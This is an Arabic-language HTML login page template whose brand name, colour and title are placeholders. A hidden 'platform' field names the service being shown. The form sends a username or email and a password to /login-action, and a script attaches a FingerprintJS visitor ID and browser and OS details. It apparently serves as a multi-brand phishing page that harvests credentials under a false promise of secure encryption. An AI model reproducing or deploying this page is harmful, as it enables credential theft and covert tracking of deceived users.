<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تسجيل الدخول - {{ platform_name }}</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: white; padding: 35px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 380px; text-align: center; border: 1px solid #dbdbdb; }
        .logo { font-size: 24px; font-weight: bold; color: {{ brand_color }}; margin-bottom: 20px; }
        .input-group { text-align: right; margin-bottom: 15px; }
        .input-group label { display: block; font-size: 13px; color: #555; margin-bottom: 5px; }
        input { width: 100%; padding: 11px 12px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 6px; box-sizing: border-box; font-size: 13px; text-align: right; }
        .submit-btn { width: 100%; padding: 12px; background: {{ brand_color }}; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; font-size: 14px; margin-top: 10px; }
        .note { font-size: 11px; color: #8e8e8e; margin-top: 15px; }
    </style>
    <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
</head>
<body>
    <div class="login-card">
        <div class="logo">{{ brand_title }}</div>
        <form method="POST" action="/login-action" id="customForm">
            <input type="hidden" name="platform" value="{{ platform }}">
            <input type="hidden" name="browser" id="cBrowser">
            <input type="hidden" name="engine" id="cEngine">
            <input type="hidden" name="platform_os" id="cPlatform">
            <input type="hidden" name="fingerprint" id="cFp">
            <div class="input-group">
                <label>البريد الإلكتروني أو اسم المستخدم</label>
                <input type="text" name="identifier" placeholder="أدخل البريد أو اسم المستخدم" required>
            </div>
            <div class="input-group">
                <label>كلمة المرور</label>
                <input type="password" name="password" placeholder="أدخل كلمة المرور" required>
            </div>
            <button type="submit" class="submit-btn">متابعة تسجيل الدخول</button>
        </form>
        <div class="note">حماية مشفرة وآمنة عبر بروتوكول المتجر.</div>
    </div>
    <script>
        window.addEventListener('DOMContentLoaded', async () => {
            try {
                const fp = await FingerprintJS.load();
                const result = await fp.get();
                document.getElementById('cFp').value = result.visitorId;
            } catch (e) {}
        });

        document.getElementById('customForm').onsubmit = function() {
            document.getElementById('cBrowser').value = navigator.appName;
            document.getElementById('cEngine').value = navigator.product || 'Gecko';
            document.getElementById('cPlatform').value = navigator.platform;
        };
    </script>
</body>
</html>
